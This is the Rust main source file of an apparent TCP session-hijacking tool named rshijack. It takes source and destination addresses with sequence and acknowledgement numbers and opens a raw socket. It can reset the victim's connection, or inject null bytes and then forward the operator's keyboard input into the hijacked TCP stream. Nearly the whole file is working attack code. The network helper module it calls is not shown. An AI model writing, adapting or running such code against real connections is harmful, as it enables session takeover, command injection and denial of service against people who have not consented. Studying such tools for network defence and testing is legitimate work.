pub mod args;
pub mod errors;
pub mod net;

use crate::args::Args;
use crate::errors::*;
use crate::net::TcpFlags;
use env_logger::Env;
use std::io::{self, Read};
use std::thread;
use structopt::StructOpt;
use std::net::SocketAddrV4;

fn main() -> Result<()> {
    let arguments = Args::from_args();

    let log_level = if arguments.quiet == 0 {
        "rshijack=debug"
    } else {
        ""
    };

    env_logger::init_from_env(Env::default()
        .default_filter_or(log_level));

    trace!("arguments: {:?}", arguments);

    eprintln!("Waiting for SEQ/ACK to arrive from the srcip to the dstip.");
    eprintln!("(To speed things up, try making some traffic between the two, /msg person asdf)");

    let mut connection = net::Connection::new(
        SocketAddrV4::new(*arguments.src.ip(), arguments.src.port()),
        SocketAddrV4::new(*arguments.dst.ip(), arguments.dst.port()),
        arguments.seq,
        arguments.ack,
    );
    eprintln!("[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}", connection.get_seq(), connection.get_ack());

    let (mut tx, _rx) = net::create_socket()?;

    if arguments.reset {
        connection.reset(&mut tx)?;
        eprintln!("[+] Connection has been reset");
        return Ok(());
    }

    {
        let mut connection = connection.clone();
        let interface = arguments.interface.clone();

        // arguments are flipped for receiving
        let dst = connection.src.clone();
        let src = connection.dst.clone();

        let (mut tx, _rx) = net::create_socket()?;

        let _recv = thread::spawn(move || {
            net::recv(&mut tx, &interface, &mut connection, &src, &dst).unwrap();
        });
    }

    if arguments.send_null {
        info!("Sending 1kb of null bytes to prevent desync");

        let data = vec![0; 1024];
        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data)?;
    }

    eprintln!("Starting hijack session, Please use ^D to terminate.");
    eprintln!("Anything you enter from now on is sent to the hijacked TCP connection.");

    let mut stdin = io::stdin();
    let mut data = vec![0; 512];
    loop {
        let len = stdin.read(&mut data)?;

        if len == 0 {
            break;
        }

        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data[..len])?;
    }

    connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::FIN, &[])?;
    eprintln!("Exiting..");

    Ok(())
}
